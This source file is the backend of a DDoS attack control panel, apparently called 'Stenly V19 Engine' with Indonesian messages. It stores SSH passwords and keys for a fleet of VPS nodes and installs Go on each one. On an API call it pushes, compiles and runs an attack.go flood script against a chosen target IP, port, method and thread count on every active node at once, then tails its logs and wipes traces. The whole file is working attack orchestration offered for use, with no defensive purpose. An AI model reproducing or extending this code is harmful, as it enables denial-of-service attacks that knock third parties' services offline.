import express from "express";
import { createServer as createViteServer } from "vite";
import { createServer } from "http";
import { Server } from "socket.io";
import path from "path";
import fs from "fs/promises";
import { db } from "./src/lib/db.ts";
import ssh2 from "ssh2";
const { Client, utils } = ssh2;
import net from "net";
import dotenv from "dotenv";
import crypto from "crypto";

dotenv.config();

const isProd = process.env.NODE_ENV === "production";

console.log(`[BOOT] Starting server in ${isProd ? "production" : "development"} mode...`);

async function startServer() {
  console.log("[BOOT] Initializing Express app...");
  const app = express();
  const httpServer = createServer(app);
  const io = new Server(httpServer);
  const rawPort = process.env.PORT ? parseInt(process.env.PORT) : 3000;
  const PORT = isNaN(rawPort) ? 3000 : rawPort;

  console.log(`[BOOT] Configured PORT: ${PORT}`);

  const ATTACK_GO_PATH = isProd 
    ? path.join(process.cwd(), "dist", "attack.go") 
    : path.join(process.cwd(), "attack.go");

  app.use(express.json());

  // API Routes
  app.get("/api/health", async (req, res) => {
    try {
      await db.query("SELECT 1");
      res.json({ status: "ok", database: "connected" });
    } catch (error) {
      res.status(500).json({ status: "error", database: "disconnected" });
    }
  });

  app.get("/api/stats", async (req, res) => {
    try {
      let [rows]: any = await db.query("SELECT * FROM stats WHERE id = 1");
      
      if (rows.length === 0) {
        await db.query("INSERT IGNORE INTO stats (id, total_attacks, total_packets, total_bytes, total_time) VALUES (1, 0, 0, 0, 0)");
        [rows] = await db.query("SELECT * FROM stats WHERE id = 1");
      }

      const [serverStats]: any = await db.query(`
        SELECT 
          COUNT(*) as total,
          SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END) as active,
          SUM(CASE WHEN status = 'dead' THEN 1 ELSE 0 END) as dead,
          COALESCE(SUM(bandwidth), 0) as total_bw
        FROM servers
      `);
      
      const statsData = rows[0] || { total_attacks: 0, total_packets: 0, total_bytes: 0, total_time: 0 };
      res.json({ ...statsData, servers: serverStats[0] || { total: 0, active: 0, dead: 0, total_bw: 0 } });
    } catch (error) {
      console.error("Stats API Error:", error);
      res.status(500).json({ error: "Failed to fetch stats", details: error instanceof Error ? error.message : "Unknown error" });
    }
  });

  app.get("/api/servers", async (req, res) => {
    try {
      const [rows] = await db.query("SELECT id, host, port, username, auth_type, managed_key_id, cpu_cores, ram_mb, bandwidth, latency, status, last_checked FROM servers ORDER BY created_at DESC");
      res.json(rows);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch servers" });
    }
  });

  app.post("/api/servers", async (req, res) => {
    const { host, port, username, password, key_content, auth_type, managed_key_id } = req.body;
    try {
      const [result]: any = await db.query(
        "INSERT INTO servers (host, port, username, password, key_content, managed_key_id, auth_type) VALUES (?, ?, ?, ?, ?, ?, ?)",
        [host, port || 22, username, password || null, key_content || null, managed_key_id || null, auth_type]
      );
      res.json({ id: result.insertId, message: "Server added" });
    } catch (error) {
      res.status(500).json({ error: "Failed to add server" });
    }
  });

  app.delete("/api/servers/:id", async (req, res) => {
    try {
      await db.query("DELETE FROM servers WHERE id = ?", [req.params.id]);
      res.json({ message: "Server deleted" });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete server" });
    }
  });

  // Managed Keys API
  app.get("/api/keys", async (req, res) => {
    try {
      const [rows] = await db.query("SELECT id, name, public_key, created_at FROM managed_keys ORDER BY created_at DESC");
      res.json(rows);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch managed keys" });
    }
  });

  app.post("/api/keys/generate", async (req, res) => {
    const { name } = req.body;
    try {
      const [existingKeys]: any = await db.query("SELECT id FROM managed_keys LIMIT 1");
      if (existingKeys.length > 0) {
        return res.status(400).json({ error: "Master Key sudah ada. Hanya diperbolehkan 1 kunci di OrbitCloud." });
      }

      const { privateKey: sshPrivateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        privateKeyEncoding: {
          type: 'pkcs1',
          format: 'pem'
        }
      } as any);

      const parsedKey: any = utils.parseKey(sshPrivateKey);
      if (parsedKey instanceof Error) throw parsedKey;
      
      const keyBuffer = parsedKey.getPublicSSH();
      const sshPublicKey = `ssh-rsa ${keyBuffer.toString('base64')} OrbitCloud-Key`;

      const [result]: any = await db.query(
        "INSERT INTO managed_keys (name, public_key, private_key) VALUES (?, ?, ?)",
        [name || `OrbitCloud Key`, sshPublicKey, sshPrivateKey]
      );
      res.json({ id: result.insertId, public_key: sshPublicKey });
    } catch (error) {
      console.error("Key generation failed:", error);
      res.status(500).json({ error: "Failed to generate key pair" });
    }
  });

  app.delete("/api/keys/:id", async (req, res) => {
    try {
      await db.query("DELETE FROM managed_keys WHERE id = ?", [req.params.id]);
      res.json({ message: "Key deleted" });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete key" });
    }
  });

  app.post("/api/attacks", async (req, res) => {
    const { target_ip, target_port, method, duration, threads } = req.body;
    
    // Sanitasi input AWAL
    const safeTargetIP = target_ip ? target_ip.replace(/[^0-9.]/g, '') : '';
    const safeTargetPort = parseInt(target_port) || 80;
    const safeDuration = parseInt(duration) || 60;
    const safeThreads = parseInt(threads) || 1000;
    const safeMethod = method ? String(method).toUpperCase().trim() : 'UDP';

    console.log(`[ATTACK_DEBUG] Target: ${safeTargetIP}, Method: ${safeMethod}`);

    try {
      // 1. Create attack log
      const [result]: any = await db.query(
        "INSERT INTO attack_logs (target_ip, target_port, method, duration, threads, status) VALUES (?, ?, ?, ?, ?, 'running')",
        [safeTargetIP, safeTargetPort, safeMethod, safeDuration, safeThreads]
      );
      const attackId = result.insertId;

      // 2. Get active servers
      const [servers]: any = await db.query(`
        SELECT s.*, mk.private_key as managed_private_key 
        FROM servers s 
        LEFT JOIN managed_keys mk ON s.managed_key_id = mk.id 
        WHERE s.status = 'active'
      `);
      
      if (servers.length === 0) {
        await db.query("UPDATE attack_logs SET status = 'failed' WHERE id = ?", [attackId]);
        return res.status(400).json({ error: "No active servers available" });
      }

      // 3. Prepare deployment command payload
      const attackScript = await fs.readFile(ATTACK_GO_PATH, "utf8");
      
      let deployedCount = 0;
      for (let i = 0; i < servers.length; i++) {
        const server = servers[i];
        const vpsID = (i + 1).toString();
        
        let remotePath = `/tmp/stenly_${attackId}`;
        
        let parameterizedScript = attackScript
          .split("{{.Duration}}").join(safeDuration.toString())
          .split("{{.Threads}}").join(safeThreads.toString())
          .split("{{.Method}}").join(safeMethod)
          .split("{{.VPS_ID}}").join(vpsID)
          .split("{{.TargetIP}}").join(safeTargetIP)
          .split("{{.TargetPort}}").join(safeTargetPort.toString());
          
        const deployCmd = `
          cat << 'EOF' > ${remotePath}.go
${parameterizedScript}
EOF
          GO_CMD="go"
          if ! command -v go >/dev/null 2>&1; then
            if [ -f /usr/local/go/bin/go ]; then
              GO_CMD="/usr/local/go/bin/go"
            elif [ -f /usr/bin/go ]; then
              GO_CMD="/usr/bin/go"
            fi
          fi

          $GO_CMD build -o ${remotePath} ${remotePath}.go && 
          chmod +x ${remotePath} &&
          nohup nice -n -20 ${remotePath} > ${remotePath}.log 2>&1 &
          echo $! > ${remotePath}.pid
        `;

        const conn = new Client();
        conn.on("ready", () => {
          conn.exec(deployCmd, (err, stream) => {
            if (err) {
              io.emit("server_log", { id: server.id, message: `❌ [DEPLO] SSH Exec failed: ${err.message}`, type: 'error' });
              return conn.end();
            }
            
            io.emit("server_log", { id: server.id, message: `☁️ [DEPLO] Terminal node ${server.host} disiapkan...` });

            let output = "";
            let stderr = "";

            stream.on("data", (data) => {
              output += data.toString();
              // Periodic progress for large compile
              if (output.length % 500 === 0) io.emit("server_log", { id: server.id, message: `⚙️ [BUILD] Processing...` });
            });

            stream.stderr.on("data", (data) => {
              const errStr = data.toString();
              stderr += errStr;
              // Clean up common non-error warnings
              if (!errStr.includes("can't find") && !errStr.includes("no such file")) {
                io.emit("server_log", { id: server.id, message: `⚠️ [DEBUG] ${errStr.trim()}`, type: 'info' });
              }
            });
            
            stream.on("close", (code) => {
              if (code !== 0) {
                io.emit("server_log", { id: server.id, message: `❌ [BUILD FAILED] Node ${server.host} gagal compile (Code ${code}).`, type: 'error' });
                if (stderr) {
                  io.emit("server_log", { id: server.id, message: `📄 ERROR LOG: ${stderr.split("\n")[0]}`, type: 'error' });
                }
                return conn.end();
              }

              deployedCount++;
              db.query("UPDATE servers SET status = 'attacking' WHERE id = ?", [server.id]);
              io.emit("server_status_update", { id: server.id, status: "attacking" });
              io.emit("server_log", { id: server.id, message: `🔥 [SUCCESS] Stenly V19 Engine ON di ${server.host}!` });
              
              // Start real-time tailing of log file for active debugging!
              conn.exec(`tail -f ${remotePath}.log`, (err, tailStream) => {
                 if (err) {
                    console.error("Failed to tail log on VPS", err);
                    conn.end();
                    return;
                 }
                 tailStream.on('data', (data) => {
                    const lines = data.toString().split('\n');
                    for (const line of lines) {
                       if (line.trim()) {
                         io.emit("server_log", { id: server.id, message: line.trim(), type: 'info' });
                       }
                    }
                 });
                 
                 // End ssh connection and cleanup after attack duration finishes (+5 seconds buffer)
                 setTimeout(() => {
                    conn.end();
                 }, parseInt(safeDuration.toString()) * 1000 + 5000);
              });
            });
          });
        }).on("error", (err) => {
          let msg = err.message;
          if (msg.includes("Authentication") || msg.includes("unauthorized")) msg = "Login Gagal: Password/Key Salah";
          else if (msg.includes("timeout")) msg = "Koneksi Timeout";
          else if (msg.includes("ECONNREFUSED")) msg = "Port 22 Tertutup";
          
          io.emit("server_log", { id: server.id, message: `❌ [CONN] Gagal terhubung ke ${server.host}: ${msg}` });
        }).connect({
          host: server.host,
          port: server.port,
          username: server.username,
          password: server.auth_type === 'password' ? server.password : undefined,
          privateKey: (server.auth_type === 'key') ? (server.managed_private_key || server.key_content || undefined) : undefined,
          timeout: 20000,
          readyTimeout: 30000,
          keepaliveInterval: 10000,
          keepaliveCountMax: 10
        });
      }

      // Update stats
      await db.query("UPDATE stats SET total_attacks = total_attacks + 1 WHERE id = 1");
      
      const [newStats]: any = await db.query("SELECT * FROM stats WHERE id = 1");
      const [serverStats]: any = await db.query(`
        SELECT 
          COUNT(*) as total,
          COALESCE(SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END), 0) as active,
          COALESCE(SUM(CASE WHEN status = 'dead' THEN 1 ELSE 0 END), 0) as dead,
          COALESCE(SUM(bandwidth), 0) as total_bw
        FROM servers
      `);
      io.emit("stats_update", { ...(newStats[0] || {}), servers: serverStats[0] });
      io.emit("attack_launched", { id: attackId, servers_deployed: servers.length });
      
      res.json({ id: attackId, message: "Attack launched", servers_deployed: servers.length });

      // Set timeout to mark as completed and cleanup
      setTimeout(async () => {
        await db.query("UPDATE attack_logs SET status = 'completed' WHERE id = ?", [attackId]);
        await db.query("UPDATE servers SET status = 'active' WHERE status = 'attacking'");
        
        const [finalStats]: any = await db.query("SELECT * FROM stats WHERE id = 1");
        const [finalServerStats]: any = await db.query(`
          SELECT 
            COUNT(*) as total,
            COALESCE(SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END), 0) as active,
            COALESCE(SUM(CASE WHEN status = 'dead' THEN 1 ELSE 0 END), 0) as dead,
            COALESCE(SUM(bandwidth), 0) as total_bw
          FROM servers
        `);
        io.emit("stats_update", { ...(finalStats[0] || {}), servers: finalServerStats[0] });
        
        // Cleanup remote processes
        for (const server of servers) {
          const conn = new Client();
          conn.on("ready", () => {
            conn.exec(`pkill -f stenly_${attackId} || true; rm -f /tmp/stenly_${attackId}*`, () => {
              io.emit("server_log", { id: server.id, message: `✅ [CLEAN] Selesai: Serangan #${attackId} di VPS ${server.host} dibersihkan.` });
              conn.end();
            });
          }).on("error", (err) => {
             console.error(`Cleanup failed for ${server.host}:`, err.message);
          }).connect({
            host: server.host,
            port: server.port,
            username: server.username,
            password: server.auth_type === 'password' ? server.password : undefined,
            privateKey: (server.auth_type === 'key') ? (server.managed_private_key || server.key_content || undefined) : undefined,
            timeout: 10000
          });
        }
        
        io.emit("attack_completed", { id: attackId });
      }, safeDuration * 1000);

    } catch (error) {
      console.error("Attack failed:", error);
      res.status(500).json({ error: "Failed to launch attack" });
    }
  });

  app.get("/api/attacks", async (req, res) => {
    try {
      const [rows] = await db.query("SELECT * FROM attack_logs ORDER BY created_at DESC LIMIT 50");
      res.json(rows);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch attack logs" });
    }
  });

  app.post("/api/attacks/stop/:id", async (req, res) => {
    const attackId = req.params.id;
    try {
      await db.query("UPDATE attack_logs SET status = 'stopped' WHERE id = ?", [attackId]);
      
      const [servers]: any = await db.query(`
        SELECT s.*, mk.private_key as managed_private_key 
        FROM servers s 
        LEFT JOIN managed_keys mk ON s.managed_key_id = mk.id
      `);
      
      io.emit("server_log", { id: 0, message: `🛑 [SYSTEM] Memulai prosedur penghentian paksa untuk serangan #${attackId}...` });

      for (const server of servers) {
        const conn = new Client();
        
        // Connection Watchdog
        let watchdog = setTimeout(() => {
          conn.end();
          io.emit("server_log", { id: server.id, message: `❌ [STOP] Timeout: VPS ${server.host} tidak merespon SSH.` });
        }, 15000);

        conn.on("ready", () => {
          clearTimeout(watchdog);
          io.emit("server_log", { id: server.id, message: `🔌 [CONN] Terhubung ke ${server.host}.` });
          
          const cmd = `
            log() { echo "STENLY_LOG: $1"; }
            log "Memeriksa status proses ddos (ID: ${attackId})..."
            
            if pgrep -f stenly_${attackId} > /dev/null; then 
              log "💀 [KILL] Ditemukan proses aktif. Mengirim sinyal terminasi..."
              pkill -9 -f stenly_${attackId} || true
              log "✅ [DONE] Proses dihentikan."
            else 
              log "ℹ️ [INFO] Tidak ada proses aktif untuk ID #${attackId}."
            fi;
            
            log "🧹 [CLEAN] Menghapus file sementara..."
            rm -f /tmp/stenly_${attackId}*
            log "🏁 [READY] Node kembali ke status Idle."
          `;
          
          conn.exec(cmd, (err, stream) => {
            if (err) {
              io.emit("server_log", { id: server.id, message: `❌ [SSH ERROR] Gagal mengirim perintah ke ${server.host}` });
              return conn.end();
            }
            
            stream.on('data', (data: any) => {
              const str = data.toString();
              const logs = str.split("\n").filter((l: string) => l.startsWith("STENLY_LOG:"));
              logs.forEach((l: string) => {
                io.emit("server_log", { id: server.id, message: l.replace("STENLY_LOG: ", "") });
              });
            });

            stream.on('close', () => {
              conn.end();
            });
          });
        }).on("error", (err) => {
            clearTimeout(watchdog);
            const errStr = err.message.toLowerCase();
            let msg = "Koneksi Gagal";
            if (errStr.includes("authentication")) msg = "Login Gagal: Auth VPS Ditolak";
            else if (errStr.includes("timeout")) msg = "Auth Timeout: VPS Lambat";
            
            io.emit("server_log", { id: server.id, message: `⚠️ [STOP] ${msg} pada ${server.host}. (Melewati)` });
        }).connect({
          host: server.host,
          port: server.port,
          username: server.username,
          password: server.auth_type === 'password' ? server.password : undefined,
          privateKey: (server.auth_type === 'key') ? (server.managed_private_key || server.key_content || undefined) : undefined,
          timeout: 15000,
          readyTimeout: 20000
        });
      }
      
      await db.query("UPDATE servers SET status = 'active' WHERE status = 'attacking'");
      io.emit("attack_stopped", { id: attackId });
      
      res.json({ message: "Termination sequence started" });
    } catch (error) {
      res.status(500).json({ error: "Failed to broadcast stop signal" });
    }
  });

  app.post("/api/servers/stop/:id", async (req, res) => {
    const serverId = req.params.id;
    try {
      const [rows]: any = await db.query(`
        SELECT s.*, mk.private_key as managed_private_key 
        FROM servers s 
        LEFT JOIN managed_keys mk ON s.managed_key_id = mk.id 
        WHERE s.id = ?
      `, [serverId]);
      
      if (rows.length === 0) return res.status(404).json({ error: "Server not found" });
      
      const server = rows[0];
      io.emit("server_log", { id: server.id, message: `⚠️ [EMERGENCY] Memulai prosedur RESET TOTAL untuk host ${server.host}...` });
      
      const conn = new Client();
      
      let watchdog = setTimeout(() => {
        conn.end();
        io.emit("server_log", { id: server.id, message: `❌ [RESET] Gagal: VPS ${server.host} tidak merespon SSH.` });
      }, 15000);

      conn.on("ready", () => {
        clearTimeout(watchdog);
        io.emit("server_log", { id: server.id, message: `🔌 [CONN] SSH terhubung ke ${server.host}.` });
        
        const cmd = `
          log() { echo "STENLY_LOG: $1"; }
          log "Memindai semua proses stenly_ yang berjalan..."
          
          count=$(pgrep -f stenly_ | wc -l);
          if [ "$count" -gt 0 ]; then
            log "💀 [PURGE] Ditemukan $count proses. Mematikan semua aktivitas..."
            pkill -9 -f stenly_ || true
          else
            log "ℹ️ [INFO] Tidak ada aktivitas serangan yang berjalan."
          fi;
          
          log "🧹 [WIPE] Menghapus database dan file biner di /tmp/..."
          rm -rf /tmp/stenly_*
          log "🏁 [DONE] Node ${server.host} kembali ke Clean State!"
        `;
        
        conn.exec(cmd, (err, stream) => {
          if (err) {
            io.emit("server_log", { id: server.id, message: `❌ [EXEC ERROR] Gagal menjalankan perintah reset.` });
            return conn.end();
          }
          
          stream.on('data', (data: any) => {
            const str = data.toString();
            const logs = str.split("\n").filter((l: string) => l.startsWith("STENLY_LOG:"));
            logs.forEach((l: string) => {
              io.emit("server_log", { id: server.id, message: l.replace("STENLY_LOG: ", "") });
            });
          });

          stream.on('close', () => {
            conn.end();
          });
        });
      }).on("error", (err) => {
          clearTimeout(watchdog);
          const errStr = err.message.toLowerCase();
          let msg = "Koneksi Gagal";
          if (errStr.includes("authentication")) msg = "Login Gagal: Password/Key Salah";
          else if (errStr.includes("timeout")) msg = "Koneksi Timeout";
          
          io.emit("server_log", { id: server.id, message: `❌ [RESET ERR] ${msg} pada ${server.host}.` });
      }).connect({
        host: server.host,
        port: server.port,
        username: server.username,
        password: server.auth_type === 'password' ? server.password : undefined,
        privateKey: (server.auth_type === 'key') ? (server.managed_private_key || server.key_content || undefined) : undefined,
        timeout: 15000,
        readyTimeout: 20000
      });

      await db.query("UPDATE servers SET status = 'active' WHERE id = ?", [serverId]);
      io.emit("server_status_update", { id: server.id, status: 'active' });
      
      res.json({ message: "Server reset signal sent" });
    } catch (error) {
      res.status(500).json({ error: "Failed to reset server activity" });
    }
  });

  app.post("/api/attacks/stop-all", async (req, res) => {
    try {
      await db.query("UPDATE attack_logs SET status = 'stopped' WHERE status = 'running'");
      const [servers]: any = await db.query(`
        SELECT s.*, mk.private_key as managed_private_key 
        FROM servers s 
        LEFT JOIN managed_keys mk ON s.managed_key_id = mk.id
      `);
      
      for (const server of servers) {
        const conn = new Client();
        conn.on("ready", () => {
          conn.exec(`pkill -f stenly_ || true; rm -f /tmp/stenly_*`, () => {
            io.emit("server_log", { id: server.id, message: "🛑 GLOBAL SHUTDOWN: Semua proses Stenly dihentikan." });
            conn.end();
          });
        }).on("error", (err) => {
            // Log error but continue with others
        }).connect({
          host: server.host,
          port: server.port,
          username: server.username,
          password: server.auth_type === 'password' ? server.password : undefined,
          privateKey: (server.auth_type === 'key') ? (server.managed_private_key || server.key_content || undefined) : undefined,
          timeout: 5000
        });
      }
      
      await db.query("UPDATE servers SET status = 'active' WHERE status = 'attacking'");
      io.emit("all_attacks_stopped");
      res.json({ message: "Global shutdown request broadcasted" });
    } catch (error) {
      res.status(500).json({ error: "Failed to stop all activities" });
    }
  });

  app.post("/api/servers/test/:id", async (req, res) => {
    try {
      const [rows]: any = await db.query(`
        SELECT s.*, mk.private_key as managed_private_key 
        FROM servers s 
        LEFT JOIN managed_keys mk ON s.managed_key_id = mk.id 
        WHERE s.id = ?
      `, [req.params.id]);
      if (rows.length === 0) return res.status(404).json({ error: "Server not found" });
      
      const server = rows[0];
      await db.query("UPDATE servers SET status = 'testing' WHERE id = ?", [server.id]);
      io.emit("server_status_update", { id: server.id, status: "testing" });

      const conn = new Client();
      
      // Watchdog timeout to prevent stuck "testing" status (Connection Phase)
      let watchdog = setTimeout(async () => {
        conn.end();
        if (!res.headersSent) {
          await db.query("UPDATE servers SET status = 'dead' WHERE id = ?", [server.id]);
          io.emit("server_status_update", { id: server.id, status: 'dead' });
          io.emit("server_log", { id: server.id, message: "❌ Koneksi Gagal: VPS tidak merespon SSH dalam 30 detik" });
          res.status(500).json({ error: "Test timeout" });
        }
      }, 30000);

      conn.on("ready", () => {
        clearTimeout(watchdog);
        
        // Start a NEW watchdog for the entire test/install process (5 minutes)
        const executionWatchdog = setTimeout(async () => {
          conn.end();
          await db.query("UPDATE servers SET status = 'dead' WHERE id = ?", [server.id]);
          io.emit("server_status_update", { id: server.id, status: 'dead' });
          io.emit("server_log", { id: server.id, message: "❌ Timeout: Proses instalasi Go terlalu lama (>5 menit)" });
        }, 300000);

        io.emit("server_log", { id: server.id, message: `✅ [CONN] SSH terhubung ke ${server.host}` });
        // Test sequence & Module Installation
        const testCmd = `
          # Function to log to stdout for socket.io
          log() { echo "STENLY_LOG: $1"; }

          log "Mengecek spesifikasi VPS..."
          NPROC=$(nproc)
          MEM=$(free -m | grep Mem | awk '{print $2}')
          echo "INFO_CPU: $NPROC"
          echo "INFO_MEM: $MEM"
          
          # Check for Go in common paths
          if [ -f "/usr/local/go/bin/go" ]; then ln -sf /usr/local/go/bin/go /usr/local/bin/go; fi

          echo "=== DEPENDENCIES ==="
          if ! command -v wget >/dev/null 2>&1 || ! command -v tar >/dev/null 2>&1; then
            log "Menginstall wget/tar..."
            if command -v apt-get >/dev/null 2>&1; then
              export DEBIAN_FRONTEND=noninteractive
              apt-get install -y -qq wget tar >/dev/null 2>&1 || (apt-get update -qq && apt-get install -y -qq wget tar >/dev/null 2>&1)
            fi
          fi

          echo "=== GO INSTALLATION ==="
          if command -v go >/dev/null 2>&1; then 
            log "Go sudah aktif: $(go version)"
          else 
            log "Go tidak ditemukan. Memulai instalasi (60MB)..."
            log "Harap tunggu, ini mungkin memakan waktu 1-3 menit..."
            cd /tmp
            wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz -O go.tar.gz || { log "Gagal mendownload Go!"; exit 1; }
            log "Mengekstrak Go Runtime..."
            rm -rf /usr/local/go && tar -C /usr/local -xzf go.tar.gz >/dev/null 2>&1
            rm -f go.tar.gz
            
            ln -sf /usr/local/go/bin/go /usr/local/bin/go
            ln -sf /usr/local/go/bin/gofmt /usr/local/bin/gofmt
            log "Go berhasil diinstall."
          fi

          export GOPATH=$HOME/go
          export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin

          log "Mengecek latensi..."
          echo "LATENCY: $(ping -c 1 8.8.8.8 | grep time= | awk -F'time=' '{print $2}' | awk '{print $1}')"
          
          pkill -f stenly_ || true
          log "Pengecekan selesai."
        `;
        
        conn.exec(testCmd, (err, stream) => {
          if (err) {
            clearTimeout(executionWatchdog);
            db.query("UPDATE servers SET status = 'dead' WHERE id = ?", [server.id]);
            io.emit("server_status_update", { id: server.id, status: 'dead' });
            return res.status(500).json({ error: "SSH exec failed" });
          }
          let output = "";
          stream.on("data", (data: any) => {
            const str = data.toString();
            output += str;
            // Kirim log real-time ke UI
            const logs = str.split("\n").filter((l: string) => l.startsWith("STENLY_LOG:"));
            logs.forEach((l: string) => {
              io.emit("server_log", { id: server.id, message: l.replace("STENLY_LOG: ", "") });
            });
          });
          stream.on("close", async () => {
            clearTimeout(executionWatchdog);
            const lines = output.trim().split("\n");
            
            // Parse CPU & RAM dari marker khusus
            const cpuLine = lines.find(l => l.startsWith("INFO_CPU:"));
            const memLine = lines.find(l => l.startsWith("INFO_MEM:"));
            
            const rawCpuValue = cpuLine?.split(":")[1];
            const rawRamValue = memLine?.split(":")[1];
            
            const rawCpu = rawCpuValue ? parseInt(rawCpuValue.trim()) : 1;
            const rawRam = rawRamValue ? parseInt(rawRamValue.trim()) : 512;
            
            const cpu = isNaN(rawCpu) ? 1 : rawCpu;
            const ram = isNaN(rawRam) ? 512 : rawRam;
            
            const hasGo = output.toLowerCase().includes("go version");
            const latencyLine = lines.find(l => l.startsWith("LATENCY:"));
            const rawLatencyValue = latencyLine?.split(":")[1];
            const rawLatency = rawLatencyValue ? parseFloat(rawLatencyValue.trim()) : 0;
            const latency = isNaN(rawLatency) ? 0 : rawLatency;
            
            const status = hasGo ? 'active' : 'dead';
            
            await db.query(
              "UPDATE servers SET status = ?, cpu_cores = ?, ram_mb = ?, latency = ? WHERE id = ?",
              [status, cpu, ram, latency, server.id]
            );
            io.emit("server_status_update", { id: server.id, status, cpu_cores: cpu, ram_mb: ram, latency });
            conn.end();
            res.json({ message: "Test completed", status, cpu, ram, latency });
          });
        });
      }).on("error", async (err) => {
        clearTimeout(watchdog);
        await db.query("UPDATE servers SET status = 'dead' WHERE id = ?", [server.id]);
        io.emit("server_status_update", { id: server.id, status: "dead" });
        
        // Kirim log spesifik kenapa gagal
        let msg = "Koneksi Gagal";
        const errStr = err.message.toLowerCase();
        if (errStr.includes("authentication") || errStr.includes("unauthorized")) msg = "Login Gagal: Password/Key Salah";
        else if (errStr.includes("timeout") || errStr.includes("etimedout")) msg = "Koneksi Timeout: Server Tidak Merespon (Check IP/Key)";
        else if (errStr.includes("connrefused") || errStr.includes("refused")) msg = "Koneksi Ditolak: Port 22 Tertutup";
        else msg = `Error: ${err.message}`;
        
        io.emit("server_log", { id: server.id, message: `❌ ${msg}` });
        
        if (!res.headersSent) {
          res.status(500).json({ error: msg });
        }
      }).connect({
        host: server.host,
        port: server.port,
        username: server.username,
        password: server.auth_type === 'password' ? server.password : undefined,
        privateKey: (server.auth_type === 'key') ? (server.managed_private_key || server.key_content || undefined) : undefined,
        timeout: 20000,
        readyTimeout: 30000,
        keepaliveInterval: 10000,
        keepaliveCountMax: 10
      });

    } catch (error) {
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    console.log("[BOOT] Starting Vite Dev Server middleware...");
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    console.log("[BOOT] Vite Dev Server middleware initialized.");
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`[BOOT] Server listening on http://0.0.0.0:${PORT}`);
    
    // Reset stuck statuses on startup (Background process)
    (async () => {
      let retries = 10;
      while (retries > 0) {
        try {
          await db.query("UPDATE servers SET status = 'dead' WHERE status = 'testing'");
          await db.query("UPDATE servers SET status = 'active' WHERE status = 'attacking'");
          console.log("[BOOT] Stuck server statuses reset successfully.");
          break;
        } catch (e) {
          retries--;
          console.error(`[BOOT] Failed to reset statuses (Retrying ${retries} more times):`, e instanceof Error ? e.message : e);
          if (retries === 0) {
            console.error("[BOOT] Critical: Could not reset server statuses after multiple attempts.");
          } else {
            await new Promise(resolve => setTimeout(resolve, 10000));
          }
        }
      }
    })();
  });
}

startServer().catch((error) => {
  console.error("Critical error during server startup:", error);
  process.exit(1);
});
